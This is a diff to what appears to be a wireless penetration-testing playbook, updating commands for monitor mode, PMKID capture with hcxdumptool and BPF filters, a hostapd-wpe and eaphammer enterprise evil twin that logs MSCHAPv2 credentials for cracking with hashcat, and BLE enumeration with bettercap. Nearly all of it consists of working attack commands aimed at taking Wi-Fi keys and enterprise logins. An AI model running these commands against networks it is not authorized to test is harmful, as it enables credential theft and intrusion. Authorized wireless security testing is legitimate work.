@@ -72,10 +72,10 @@ Zero transmission. Capture all beacon frames and probe requests in range.
 iw dev; iw list | grep -A5 "Supported interface modes"
 
 # Enable monitor mode
-sudo airmon-ng start wlan0        # creates wlan0mon
+sudo airmon-ng start wlan0        # creates wlan0mon (or leaves wlan0 in monitor)
 # or manually:
 sudo ip link set wlan0 down
-sudo iw wlan0 set monitor control
+sudo iw dev wlan0 set type monitor   # canonical form; add flags via `set monitor <flag>` if needed
 sudo ip link set wlan0 up
 
 # Kill interfering processes first
@@ -160,11 +160,14 @@ Decision rules:
 Faster than handshake — requests PMKID directly from AP without waiting for client association.
 
 ```bash
-# hcxdumptool — capture PMKID
-sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3
+# hcxdumptool >= 6.3 (Kali 2024+): -o/--enable_status/--filterlist_ap were removed.
+# Use -w for the pcapng, --rds for realtime display, and BPF for AP filtering.
+sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --rds=1
 
-# Filter for specific BSSID
-sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=bssid.txt --filtermode=2
+# Filter for specific BSSID via Berkeley Packet Filter
+sudo tcpdump -y IEEE802_11_RADIO -i wlan0mon --dump-bpf \
+  "wlan addr3 aa:bb:cc:dd:ee:ff" > bssid.bpf
+sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --bpf=bssid.bpf --rds=1
 
 # Convert for hashcat (mode 22000)
 hcxpcapngtool -o hash22000.txt pmkid.pcapng
@@ -270,9 +273,10 @@ sudo bettercap -eval "set wifi.interface wlan0mon; wifi.recon on"
 Force clients to connect to rogue RADIUS → capture MSCHAPv2 hashes → crack offline.
 
 ```bash
-# hostapd-wpe — enterprise evil twin with credential logging
+# hostapd-wpe — enterprise evil twin with credential logging (from aircrack-ng patch set or eaphammer build)
 sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
-# Captured hashes in /tmp/hostapd-wpe.log — crack with hashcat -m 5500 (NetNTLMv1) or -m 5600 (NetNTLMv2)
+# Captured hashes default to ./hostapd-wpe.log (override with wpe_logfile= in conf).
+# The MSCHAPv2 challenge/response pair is NetNTLMv1-shape → crack with hashcat -m 5500 (or asleap).
 
 # eaphammer — full enterprise attack suite
 python3 eaphammer -i wlan0mon --channel <ch> --auth wpa-eap --essid "Corp-WiFi" \
@@ -324,7 +328,10 @@ gatttool -b <device_MAC> -I
 [device_MAC][LE]> primary          # list services
 [device_MAC][LE]> characteristics  # list characteristics
 
-# btlejuice / bettercap for BLE MITM
+# NOTE: hcitool + gatttool are deprecated upstream (BlueZ 'bluez-deprecated' package).
+# On modern distros prefer bluetoothctl (interactive), btmgmt (management), and
+# btgatt-client / bluetoothctl gatt.* commands for GATT work. bettercap is the
+# operator-facing shortcut for scan + GATT enum + write:
 sudo bettercap -eval "ble.recon on"
 bettercap> ble.show                     # show discovered devices
 bettercap> ble.enum <MAC>               # enumerate all handles
